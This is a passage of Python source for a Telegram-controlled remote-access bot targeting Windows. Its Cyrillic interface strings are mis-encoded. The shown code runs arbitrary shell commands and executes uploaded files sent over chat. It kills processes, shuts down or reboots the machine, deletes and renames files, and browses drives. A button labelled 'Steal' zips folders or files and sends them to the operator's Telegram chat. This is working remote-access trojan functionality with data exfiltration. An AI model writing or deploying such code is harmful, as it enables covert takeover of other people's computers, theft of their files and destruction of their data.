        show_notification("–°–∫—Ä–∏–Ω—à–æ—Ç", f"{user_nick} —Å–¥–µ–ª–∞–ª —Å–∫—Ä–∏–Ω—à–æ—Ç", "üì∏")
        
    except Exception as e:
        bot.send_message(message.chat.id, f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}')

# --- –ü—Ä–æ—Ü–µ—Å—Å—ã –∫–∞–∫ –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —Å–ø–∏—Å–æ–∫ ---
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üóÇ –ü—Ä–æ—Ü–µ—Å—Å—ã')
def processes_list_handler(message):
    import psutil
    # –ë–ª–æ–∫–ª–∏—Å—Ç –ø—Ä–æ—Ü–µ—Å—Å–æ–≤
    ignored_processes = [
        'svchost.exe', 'powershell.exe', 'SearchApp.exe', 
        'SystemSettings.exe', 'conhost.exe', 'fontdrvhost.exe',
        'ctfmon.exe', 'AUEPMaster.exe', 'taskhostw.exe', 'sihost.exe',
        'StartMenuExperienceHost.exe', 'WmiPrvSE.exe', 'WUDFHost.exe',
        'AMDRSServ.exe', 'amdfendrsr.exe', 'tiesrxx.exe',
        'AMDInstallManager.exe', 'steam-idle.exe', 'unsecapp.exe',
        'lsass.exe', 'services.exe', 'smss.exe', 'spoolsv.exe',
        'dllhost.exe', 'atieclxx.exe', 'atiesrxx.exe', 'audiodg.exe',
        'TextInputHost.exe', 'UserOOBEBroker.exe', 'SecurityHealthService.exe',
        'ShellExperienceHost.exe', 'RuntimeBroker.exe', 'RvControlSvc.exe',
        'SearchIndexer.exe', 'MicrosoftEdgeUpdate.exe', 'AMDRSSrcExt.exe',
        'AUEPDU.exe', 'ApplicationFrameHost.exe'
    ]
    processes = []
    seen_names = set()
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            name = proc.info['name']
            if name in ignored_processes or name in seen_names:
                continue
            seen_names.add(name)
            processes.append((proc.info['pid'], name))
        except Exception:
            pass
    processes = sorted(processes, key=lambda x: x[1].lower())
    markup = InlineKeyboardMarkup(row_width=1)
    for pid, name in processes[:50]:
        markup.add(InlineKeyboardButton(f'{name} (PID {pid})', callback_data=f'proc:menu:{pid}'))
    bot.send_message(message.chat.id, '–°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ (—É–Ω–∏–∫–∞–ª—å–Ω—ã–µ, –ø–µ—Ä–≤—ã–µ 50):', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('proc:menu:'))
def process_menu_callback(call):
    pid = int(call.data.split(':')[2])
    import psutil
    try:
        proc = psutil.Process(pid)
        name = proc.name()
    except Exception:
        bot.edit_message_text('–ü—Ä–æ—Ü–µ—Å—Å –Ω–µ –Ω–∞–π–¥–µ–Ω.', call.message.chat.id, call.message.message_id)
        bot.answer_callback_query(call.id)
        return
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton('‚ùå –ó–∞–≤–µ—Ä—à–∏—Ç—å', callback_data=f'proc:kill:{pid}'),
        InlineKeyboardButton('üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å', callback_data=f'proc:restart:{pid}'),
        InlineKeyboardButton('–û—Ç–º–µ–Ω–∞', callback_data='proc:cancel')
    )
    bot.edit_message_text(f'–ü—Ä–æ—Ü–µ—Å—Å: {name} (PID {pid})', call.message.chat.id, call.message.message_id, reply_markup=markup)
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data.startswith('proc:'))
def process_action_callback(call):
    import psutil, os, sys, subprocess
    parts = call.data.split(':')
    action = parts[1]
    if action == 'kill':
        pid = int(parts[2])
        try:
            proc = psutil.Process(pid)
            proc.terminate()
            bot.edit_message_text('‚úÖ –ü—Ä–æ—Ü–µ—Å—Å –∑–∞–≤–µ—Ä—à—ë–Ω.', call.message.chat.id, call.message.message_id)
        except Exception as e:
            bot.edit_message_text(f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≤–µ—Ä—à–∏—Ç—å: {e}', call.message.chat.id, call.message.message_id)
    elif action == 'restart':
        pid = int(parts[2])
        try:
            proc = psutil.Process(pid)
            exe = proc.exe()
            proc.terminate()
            proc.wait(timeout=3)
            subprocess.Popen([exe])
            bot.edit_message_text('üîÑ –ü—Ä–æ—Ü–µ—Å—Å –ø–µ—Ä–µ–∑–∞–ø—É—â–µ–Ω.', call.message.chat.id, call.message.message_id)
        except Exception as e:
            bot.edit_message_text(f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å: {e}', call.message.chat.id, call.message.message_id)
    elif action == 'cancel':
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üíª Cmd')
def cmd_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='cmd:cancel'))
    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –≤ cmd:', reply_markup=markup)
    bot.register_next_step_handler(msg, cmd_execute_handler)

@bot.callback_query_handler(func=lambda call: call.data == 'cmd:cancel')
def cmd_cancel_callback(call):
    user_id = call.from_user.id
    user_paths[user_id] = user_paths.get(user_id, {})
    user_paths[user_id]['cancelled'] = True
    try:
        bot.edit_message_text('–î–µ–π—Å—Ç–≤–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–æ.', call.message.chat.id, call.message.message_id)
    except Exception:
        pass
    try:
        bot.clear_step_handler_by_chat_id(call.message.chat.id)
    except Exception:
        pass
    bot.answer_callback_query(call.id)

def cmd_execute_handler(message):
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if user_paths.get(message.from_user.id, {}).get('cancelled'):
        user_paths[message.from_user.id]['cancelled'] = False
        return
    command = message.text
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        stdout, stderr = process.communicate()
        response = ''
        if stdout:
            response += f'<pre>{escape_html(stdout)}</pre>'
        if stderr:
            response += f'\n‚ùå –û—à–∏–±–∫–∞:\n<pre>{escape_html(stderr)}</pre>'
        if not response:
            response = '‚úÖ –ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞'
        if len(response) > 4000:
            bot.send_message(message.chat.id, '‚ùå –°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –≤—ã–≤–æ–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –æ–¥–Ω–∏–º —Å–æ–æ–±—â–µ–Ω–∏–µ–º.')
        else:
            bot.send_message(message.chat.id, response, parse_mode='HTML')
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∫–æ–º–∞–Ω–¥—ã: {str(e)}')

def shutdown_system(cmd):
    os.system(cmd)

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö')
def reboot_request_handler(message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if 'üîÑ –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö' in restrictions:
        bot.send_message(message.chat.id, '‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.')
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', callback_data='reboot:yes'), InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='reboot:no'))
    bot.send_message(message.chat.id, '‚ö†Ô∏è –í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö?', reply_markup=markup)

def reboot_confirm_handler(message):
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if message.text.strip().lower() == '–¥–∞':
        bot.send_message(message.chat.id, '–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞...')
        shutdown_system('shutdown /r /t 0')
    else:
        bot.send_message(message.chat.id, '–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞.')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == '‚èπ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö')
def shutdown_request_handler(message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if '‚èπ –í—ã–∫–ª—é—á–∏—Ç—å –ü–ö' in restrictions:
        bot.send_message(message.chat.id, '‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.')
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å', callback_data='shutdown:yes'), InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='shutdown:no'))
    bot.send_message(message.chat.id, '‚ö†Ô∏è –í—ã —É–≤–µ—Ä–µ–Ω—ã, —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∫–ª—é—á–∏—Ç—å –ü–ö?', reply_markup=markup)

def shutdown_confirm_handler(message):
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if message.text.strip().lower() == '–¥–∞':
        bot.send_message(message.chat.id, '–í—ã–∫–ª—é—á–µ–Ω–∏–µ...')
        shutdown_system('shutdown /s /t 0')
    else:
        bot.send_message(message.chat.id, '–í—ã–∫–ª—é—á–µ–Ω–∏–µ –æ—Ç–º–µ–Ω–µ–Ω–∞.')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üìÇ –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª')
def runfile_request_handler(message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if 'üìÇ –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ñ–∞–π–ª' in restrictions:
        bot.send_message(message.chat.id, '‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.')
        return
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='runfile:cancel'))
    msg = bot.send_message(message.chat.id, '–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª, –∫–æ—Ç–æ—Ä—ã–π –Ω—É–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å.', reply_markup=markup)
    bot.register_next_step_handler(msg, runfile_receive_handler)

def runfile_receive_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if message.from_user.id not in ALLOWED_USER_ID:
        return
    if not message.document:
        bot.send_message(message.chat.id, '‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –∫–∞–∫ –¥–æ–∫—É–º–µ–Ω—Ç.')
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        if not file_info.file_path:
            bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É.')
            return
        downloaded_file = bot.download_file(file_info.file_path)
        import tempfile, os
        filename = os.path.join(tempfile.gettempdir(), message.document.file_name)
        with open(filename, 'wb') as f:
            f.write(downloaded_file)
        bot.send_message(message.chat.id, f'–§–∞–π–ª —Å–æ—Ö—Ä–∞–Ω—ë–Ω –∫–∞–∫ {filename}. –ó–∞–ø—É—Å–∫–∞—é...')
        os.startfile(filename)
        bot.send_message(message.chat.id, '‚úÖ –§–∞–π–ª –∑–∞–ø—É—â–µ–Ω.')
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ —Ñ–∞–π–ª–∞: {str(e)}')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üóÇ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫')
def explorer_entry(message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è
    restrictions = USER_RESTRICTIONS.get(message.from_user.id, [])
    if 'üóÇ –ü—Ä–æ–≤–æ–¥–Ω–∏–∫' in restrictions:
        bot.send_message(message.chat.id, '‚ùå –£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏.')
        return
    
    user_paths[message.from_user.id] = {'path': 'C:\\', 'page': 0, 'map': {}, 'show_drives': False}
    show_directory(message.chat.id, message.from_user.id)

def show_directory(chat_id, user_id, message_id=None):
    state = user_paths.get(user_id, {'path': 'C:\\', 'page': 0, 'map': {}, 'show_drives': False})
    path = state['path']
    page = state['page']
    id_map = {}
    markup = types.InlineKeyboardMarkup(row_width=1)
    # –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —Å–ø–∏—Å–æ–∫ –¥–∏—Å–∫–æ–≤, –µ—Å–ª–∏ show_drives True –∏–ª–∏ –µ—Å–ª–∏ path == 'DRIVES'
    if state.get('show_drives', False) or path == 'DRIVES':
        drives = list_drives()
        for idx, drive in enumerate(drives):
            id_map[str(idx)] = drive
            markup.add(types.InlineKeyboardButton(f'üíΩ {drive}', callback_data=f'explorer:cd:{idx}'))
        state['map'] = id_map
        state['show_drives'] = True
        user_paths[user_id] = state
        text = '–î–∏—Å–∫–∏ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ:'
        if message_id:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        else:
            bot.send_message(chat_id, text, reply_markup=markup)
        return
    try:
        items = os.listdir(path)
        items.sort()
        total = len(items)
        start = page * PAGE_SIZE
        end = start + PAGE_SIZE
        page_items = items[start:end]
        for idx, item in enumerate(page_items):
            full_path = os.path.join(path, item)
            elem_id = str(idx)
            id_map[elem_id] = full_path
            if os.path.isdir(full_path):
                markup.add(types.InlineKeyboardButton(f'üìÅ {item}', callback_data=f'explorer:dir:{elem_id}'))
            else:
                markup.add(types.InlineKeyboardButton(f'üìÑ {item}', callback_data=f'explorer:file:{elem_id}'))
        nav_buttons = []
        if page > 0:
            nav_buttons.append(types.InlineKeyboardButton('‚¨ÖÔ∏è', callback_data='explorer:page:-1'))
        if end < total:
            nav_buttons.append(types.InlineKeyboardButton('‚û°Ô∏è', callback_data='explorer:page:1'))
        if nav_buttons:
            markup.add(*nav_buttons)
        # –ö–Ω–æ–ø–∫–∞ ".."
        if os.path.dirname(path) != path:
            if os.path.dirname(path) == path or path.rstrip('\\/') in list_drives():
                # –ï—Å–ª–∏ –º—ã –≤ –∫–æ—Ä–Ω–µ –¥–∏—Å–∫–∞, –∫–Ω–æ–ø–∫–∞ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç –∫ —Å–ø–∏—Å–∫—É –¥–∏—Å–∫–æ–≤
                id_map['..'] = 'DRIVES'
                markup.add(types.InlineKeyboardButton('‚¨ÜÔ∏è .. (–∫–æ –≤—Å–µ–º –¥–∏—Å–∫–∞–º)', callback_data='explorer:cd:..'))
            else:
                id_map['..'] = os.path.dirname(path)
                markup.add(types.InlineKeyboardButton('‚¨ÜÔ∏è ..', callback_data='explorer:cd:..'))
        # –ö–Ω–æ–ø–∫–∞ "–í—Å–µ –¥–∏—Å–∫–∏" —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –º—ã –≤ –∫–æ—Ä–Ω–µ –¥–∏—Å–∫–∞
        drives_lower = [d.lower() for d in list_drives()]
        current_path = path.lower().rstrip('\\/') + '\\'
        if current_path in drives_lower:
            markup.add(types.InlineKeyboardButton('üíΩ –í—Å–µ –¥–∏—Å–∫–∏', callback_data='explorer:drives:0'))
        state['map'] = id_map
        state['show_drives'] = False
        user_paths[user_id] = state
        text = f'–ü–∞–ø–∫–∞: {path}\n–ü–æ–∫–∞–∑–∞–Ω–æ {start+1}-{min(end,total)} –∏–∑ {total}'
        if message_id:
            bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
        else:
            bot.send_message(chat_id, text, reply_markup=markup)
    except Exception as e:
        bot.send_message(chat_id, f'‚ùå –û—à–∏–±–∫–∞: {e}')

def show_item_actions(chat_id, user_id, item_id, is_dir, message_id=None, show_size=False):
    state = user_paths.get(user_id, {})
    id_map = state.get('map', {})
    item_path = id_map.get(item_id)
    if not item_path:
        bot.send_message(chat_id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç.')
        return
    markup = types.InlineKeyboardMarkup(row_width=3)
    if is_dir:
        markup.add(
            types.InlineKeyboardButton(f'üìÇ –û—Ç–∫—Ä—ã—Ç—å', callback_data=f'explorer:action:open:{item_id}:dir'),
            types.InlineKeyboardButton(f'üì• –£–∫—Ä–∞—Å—Ç—å', callback_data=f'explorer:action:steal:{item_id}:dir'),
            types.InlineKeyboardButton(f'üóë –£–¥–∞–ª–∏—Ç—å', callback_data=f'explorer:action:delete:{item_id}:dir'),
            types.InlineKeyboardButton(f'‚úèÔ∏è –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å', callback_data=f'explorer:action:rename:{item_id}:dir')
        )
    else:
        markup.add(
            types.InlineKeyboardButton(f'üìÑ –û—Ç–∫—Ä—ã—Ç—å', callback_data=f'explorer:action:open:{item_id}:file'),
            types.InlineKeyboardButton(f'üì• –£–∫—Ä–∞—Å—Ç—å', callback_data=f'explorer:action:steal:{item_id}:file'),
            types.InlineKeyboardButton(f'üóë –£–¥–∞–ª–∏—Ç—å', callback_data=f'explorer:action:delete:{item_id}:file'),
            types.InlineKeyboardButton(f'‚úèÔ∏è –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å', callback_data=f'explorer:action:rename:{item_id}:file')
        )
    markup.add(types.InlineKeyboardButton('üìè –†–∞–∑–º–µ—Ä', callback_data=f'explorer:action:size:{item_id}:dir' if is_dir else f'explorer:action:size:{item_id}:file'))
    markup.add(types.InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data=f'explorer:action:cancel:{item_id}:dir' if is_dir else f'explorer:action:cancel:{item_id}:file'))
    text = f"{'–ü–∞–ø–∫–∞' if is_dir else '–§–∞–π–ª'}: {item_path}"
    if show_size:
        size = get_size(item_path)
        size_str = human_size(size)
        text += f"\n–†–∞–∑–º–µ—Ä: {size_str}"
    if message_id:
        bot.edit_message_text(text, chat_id, message_id, reply_markup=markup)
    else:
        bot.send_message(chat_id, text, reply_markup=markup)

# –ú–æ–¥–∏—Ñ–∏—Ü–∏—Ä—É–µ–º explorer_callback –¥–ª—è –ø–æ–∫–∞–∑–∞ –º–µ–Ω—é –¥–µ–π—Å—Ç–≤–∏–π
@bot.callback_query_handler(func=lambda call: call.data.startswith('explorer:'))
def explorer_callback(call):
    user_id = call.from_user.id
    if user_id not in ALLOWED_USER_ID:
        return
    data = call.data.split(':', 2)
    action = data[1]
    arg = data[2] if len(data) > 2 else ''
    state = user_paths.get(user_id, {'path': 'C:\\', 'page': 0, 'map': {}, 'show_drives': False})
    id_map = state.get('map', {})
    if action == 'cd':
        if arg == '..':
            if id_map.get('..') == 'DRIVES':
                state['path'] = 'DRIVES'
                state['show_drives'] = True
            else:
                state['path'] = id_map.get('..', state['path'])
                state['show_drives'] = False
        else:
            new_path = id_map.get(arg, state['path'])
            if new_path in list_drives():
                state['path'] = new_path
                state['show_drives'] = False
            else:
                state['path'] = new_path
                state['show_drives'] = False
        state['page'] = 0
        user_paths[user_id] = state
        show_directory(call.message.chat.id, user_id, call.message.message_id)
    elif action == 'file':
        file_path = id_map.get(arg)
        if file_path:
            show_item_actions(call.message.chat.id, user_id, arg, is_dir=False, message_id=call.message.message_id)
    elif action == 'page':
        delta = int(arg)
        state['page'] = max(0, state['page'] + delta)
        user_paths[user_id] = state
        show_directory(call.message.chat.id, user_id, call.message.message_id)
    elif action == 'drives':
        state['path'] = 'DRIVES'
        state['show_drives'] = True
        state['page'] = 0
        user_paths[user_id] = state
        show_directory(call.message.chat.id, user_id, call.message.message_id)
    elif action == 'dir':
        show_item_actions(call.message.chat.id, user_id, arg, is_dir=True, message_id=call.message.message_id)
    elif action == 'action':
        # explorer:action:—Ç–∏–ø:item_id:file/dir
        parts = call.data.split(':', 5)
        act_type = parts[2]
        item_id = parts[3]
        item_kind = parts[4]
        id_map = state.get('map', {})
        item_path = id_map.get(item_id)
        if not item_path and act_type != 'cancel':
            bot.send_message(call.message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç.')
            bot.answer_callback_query(call.id)
            return
        if act_type == 'open':
            if item_kind == 'dir':
                state['path'] = item_path
                state['page'] = 0
                user_paths[user_id] = state
                show_directory(call.message.chat.id, user_id, call.message.message_id)
            else:
                try:
                    os.startfile(item_path)
                    bot.send_message(call.message.chat.id, f'‚úÖ –§–∞–π–ª {item_path} –æ—Ç–∫—Ä—ã—Ç –Ω–∞ –ü–ö.')
                except Exception as e:
                    bot.send_message(call.message.chat.id, f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Ñ–∞–π–ª: {e}')
        elif act_type == 'steal':
            if item_kind == 'dir':
                import shutil, tempfile
                import zipfile
                try:
                    tmpdir = tempfile.mkdtemp()
                    zip_path = os.path.join(tmpdir, os.path.basename(item_path) + '.zip')
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                        for root, dirs, files in os.walk(item_path):
                            for file in files:
                                abs_path = os.path.join(root, file)
                                rel_path = os.path.relpath(abs_path, item_path)
                                zipf.write(abs_path, arcname=rel_path)
                    bot.send_document(call.message.chat.id, open(zip_path, 'rb'))
                except Exception as e:
                    bot.send_message(call.message.chat.id, f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∞—Ä—Ö–∏–≤: {e}')
            else:
                try:
                    bot.send_document(call.message.chat.id, open(item_path, 'rb'))
                except Exception as e:
                    bot.send_message(call.message.chat.id, f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–∞–π–ª: {e}')
        elif act_type == 'delete':
            import shutil
            try:
                if item_kind == 'dir':
                    shutil.rmtree(item_path)
                else:
                    os.remove(item_path)
                bot.send_message(call.message.chat.id, '‚úÖ –£–¥–∞–ª–µ–Ω–æ!')
                # –ü–æ—Å–ª–µ —É–¥–∞–ª–µ–Ω–∏—è –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –∫ —Ä–æ–¥–∏—Ç–µ–ª—é
                parent = os.path.dirname(item_path)
                state['path'] = parent
                state['page'] = 0
                user_paths[user_id] = state
                show_directory(call.message.chat.id, user_id, call.message.message_id)
            except Exception as e:
                bot.send_message(call.message.chat.id, f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å: {e}')
        elif act_type == 'cancel':
            # –ï—Å–ª–∏ —Ñ–∞–π–ª –±—ã–ª –≤—ã–∑–≤–∞–Ω —á–µ—Ä–µ–∑ —Å–æ–æ–±—â–µ–Ω–∏–µ, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º—Å—è –∫ –µ–≥–æ –ø–∞–ø–∫–µ
            if item_id == 'filemsg' and not (item_kind == 'dir'):
                parent = os.path.dirname(item_path)
                state['path'] = parent
                state['page'] = 0
                user_paths[user_id] = state
                show_directory(call.message.chat.id, user_id, call.message.message_id)
            else:
                show_directory(call.message.chat.id, user_id, call.message.message_id)
        elif act_type == 'size':
            show_item_actions(call.message.chat.id, user_id, item_id, is_dir=(item_kind=='dir'), message_id=call.message.message_id, show_size=True)
        elif act_type == 'rename':
            msg = bot.send_message(call.message.chat.id, '–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤–æ–µ –∏–º—è:')
            bot.register_next_step_handler(msg, handle_rename, user_id, item_id, item_kind, call.message.message_id)
        bot.answer_callback_query(call.id)
    else:
        bot.answer_callback_query(call.id)

def handle_rename(message, user_id, item_id, item_kind, message_id):
    state = user_paths.get(user_id, {})
    id_map = state.get('map', {})
    item_path = id_map.get(item_id)
    if not item_path:
        bot.send_message(message.chat.id, '‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ —ç–ª–µ–º–µ–Ω—Ç.')
        return
    new_name = message.text.strip()
    if not new_name:
        bot.send_message(message.chat.id, '‚ùå –ò–º—è –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º.')
        return
    new_path = os.path.join(os.path.dirname(item_path), new_name)
    try:
        os.rename(item_path, new_path)
        bot.send_message(message.chat.id, f'‚úÖ –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞–Ω–æ –≤ {new_name}')
        # –û–±–Ω–æ–≤–∏—Ç—å –ø—Ä–æ–≤–æ–¥–Ω–∏–∫
        parent = os.path.dirname(new_path)
        user_paths[user_id] = {'path': parent, 'page': 0, 'map': {}, 'show_drives': False}
        show_directory(message.chat.id, user_id, message_id)
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–∏–º–µ–Ω–æ–≤–∞—Ç—å: {e}')

@bot.message_handler(func=lambda message: message.from_user.id in ALLOWED_USER_ID and message.text == 'üåê –°—Å—ã–ª–∫–∞')
def url_request_handler(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton('‚ùå –û—Ç–º–µ–Ω–∞', callback_data='url:cancel'))
    msg = bot.send_message(message.chat.id, '–í–≤–µ–¥–∏—Ç–µ —Å—Å—ã–ª–∫—É –∏–ª–∏ —Ç–µ–∫—Å—Ç –¥–ª—è –æ—Ç–∫—Ä—ã—Ç–∏—è –≤ –±—Ä–∞—É–∑–µ—Ä–µ:', reply_markup=markup)
    bot.register_next_step_handler(msg, url_open_handler)

def url_open_handler(message):
    user_id = message.from_user.id
    if user_paths.get(user_id, {}).get('cancelled'):
        user_paths[user_id]['cancelled'] = False
        return
    if not message.text or not message.text.strip():
        return
    if message.text.strip().lower() == '–æ—Ç–º–µ–Ω–∞':
        return
    import webbrowser
    url = message.text.strip()
    if not url:
        bot.send_message(message.chat.id, '‚ùå –ü—É—Å—Ç–∞—è —Å—Å—ã–ª–∫–∞ –∏–ª–∏ —Ç–µ–∫—Å—Ç.')
        
        return
    try:
        webbrowser.open(url)
        bot.send_message(message.chat.id, f'‚úÖ –û—Ç–∫—Ä—ã—Ç–æ –≤ –±—Ä–∞—É–∑–µ—Ä–µ: {url}')
    except Exception as e:
        bot.send_message(message.chat.id, f'‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É: {e}')
    

# --- Callback-–æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –¥–ª—è inline-–∫–Ω–æ–ø–æ–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –∏ –æ—Ç–º–µ–Ω—ã ---
@bot.callback_query_handler(func=lambda call: call.data == 'reboot:yes')
def reboot_yes_callback(call):
    bot.edit_message_text('–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞...', call.message.chat.id, call.message.message_id)
    shutdown_with_display_off('shutdown /r /t 0')
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == 'reboot:no')
def reboot_no_callback(call):
